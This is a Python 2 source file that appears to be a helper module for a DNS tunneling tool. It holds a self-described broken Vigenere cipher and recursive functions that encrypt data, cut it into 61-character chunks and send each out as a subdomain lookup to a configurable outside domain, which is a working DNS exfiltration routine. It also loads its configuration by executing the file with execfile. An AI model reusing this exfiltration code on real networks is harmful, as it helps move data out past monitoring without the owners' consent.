import os.path
import socket
import random
import string
import sys

class MyException(Exception):
    pass

def readconfig():
    config = {}
    if os.path.isfile("global_config.ini"):     
        execfile("global_config.ini", config)
    else :
        sys.exit("Config file not found")    

    return config

# encrypt our staff with Vigenere, code stolen from here: https://inventwithpython.com/vigenereCipher.py
# this has the security as an MTP encryption (Many Time Pad) - see here http://travisdazell.blogspot.in/2012/11/many-time-pad-attack-crib-drag.html
# yes, this crypto is broken
def translateMessage(message, key, mode):
    LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    translated = []  # stores the encrypted/decrypted message string
    keyIndex = 0
    key = key.upper()
    for symbol in message:  # loop through each character in message
        num = LETTERS.find(symbol.upper())
        if num != -1:  # -1 means symbol.upper() was not found in LETTERS
            if mode == 'encrypt':
                num += LETTERS.find(key[keyIndex])  # add if encrypting
            elif mode == 'decrypt':
                num -= LETTERS.find(key[keyIndex])  # subtract if decrypting
            num %= len(LETTERS)  # handle the potential wrap-around
            # add the encrypted/decrypted symbol to the end of translated.
            if symbol.isupper():
                translated.append(LETTERS[num])
            elif symbol.islower():
                translated.append(LETTERS[num].lower())
            keyIndex += 1  # move to the next letter in the key
            if keyIndex == len(key):
                keyIndex = 0
        else:
            # The symbol was not in LETTERS, so add it to translated as is.
            translated.append(symbol)
    return ''.join(translated)

# for dns tunneling split the domain names
def rec_split(str, key, host, target,subdomain):
    enc1 = translateMessage(str[:61], key, 'encrypt')
    socket.gethostbyname(enc1 + '.' + host + subdomain + target)
    if len(str) > 61:
        rec_split('X-' + str[61:], key, host, target,subdomain)
# for dns tunneling split the domain names
def rec_split2(str, key, host, target,subdomain):
    dec1 = translateMessage(str[:61], key, 'decrypt')
    print("Decrypted message: " + dec1)
    print("Trying to resolve: " + str[:61] + '.' + host + subdomain + target)
    socket.gethostbyname(str[:61] + '.' + host + subdomain + target)
    if len(str) > 61:
        rec_split2('X-' + str[61:], key, host, target,subdomain)
# create random word with length
def randomword(length):
   return ''.join(random.choice(string.lowercase) for i in range(length))